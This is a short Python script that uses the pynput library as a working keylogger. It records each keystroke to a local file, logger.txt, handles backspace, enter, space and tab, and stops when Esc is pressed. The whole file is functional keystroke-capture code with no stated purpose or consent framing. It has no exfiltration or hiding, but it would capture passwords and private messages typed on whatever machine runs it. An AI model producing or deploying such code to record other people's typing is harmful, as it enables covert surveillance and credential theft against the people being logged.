from pynput import keyboard

file_path = "logger.txt"

def on_press(key):
    try:
        with open(file_path, "a+") as f:
            if key == keyboard.Key.backspace:
                # Read current content
                f.seek(0)
                content = f.read()

                # Remove last character (if exists)
                if content:
                    content = content[:-1]

                # Overwrite file with updated content
                f.seek(0)
                f.truncate()
                f.write(content)

            elif key == keyboard.Key.enter:
                f.write("\n")  # Add a new line

            elif key == keyboard.Key.space:
                f.write(" ")  # Add space

            elif key == keyboard.Key.tab:
                f.write("\t")  # Add tab space

            elif key == keyboard.Key.esc:
                print("Exiting...")
                return False  # Stop listener

            # Ignore shift, ctrl, alt, function keys, etc.
            elif hasattr(key, 'char') and key.char is not None:
                f.write(key.char)  # Write normal characters

    except Exception as e:
        print(f"Error: {e}")

# Start keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
